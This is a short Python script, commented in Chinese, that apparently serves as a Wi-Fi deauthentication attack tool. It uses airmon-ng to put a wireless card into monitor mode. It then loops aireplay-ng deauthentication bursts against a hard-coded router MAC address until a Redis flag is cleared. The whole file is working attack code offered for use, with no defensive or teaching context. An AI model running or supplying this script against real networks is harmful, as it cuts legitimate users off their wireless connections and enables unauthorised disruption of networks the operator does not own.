# coding:utf-8
"""
根据获得的wifi信息不断攻击目标wifi
create by swm
2018/03/23
"""
from subprocess import call
import time
import redis


class ATTACK:

    def __init__(self, mac, wlanname):
        self.mac = mac
        self.wlanname = wlanname

    # 选择wifi，并开启wlanmon,准备开始路由攻击
    def startwlanmon(self):
        call('ifconfig {} up'.format(self.wlanname), shell=True)
        call('airmon-ng check kill', shell=True)
        call('airmon-ng start {}'.format(self.wlanname), shell=True)
        return

    def startattack(self):
        r = redis.Redis(host="localhost", port=6379)
        r.hset('attack', 'statu', 1)
        attack = r.hget('attack', 'statu')
        while int(attack) == 1:
            cmd = 'aireplay-ng -0 10 -a {} {}mon'.format(self.mac, self.wlanname)
            call(cmd, shell=True)
            time.sleep(0.2)
            attack = r.hget('attack', 'statu')
        else:
            call('airmon-ng stop {}mon'.format(self.wlanname))

    def start(self):
        # 1、开启airmongo
        # 2、开始进行路由攻击
        self.startwlanmon()
        self.startattack()
        return


if __name__ == '__main__':
    attack = ATTACK('50:2B:73:F4:35:F1', 'wlan1')
    attack.start()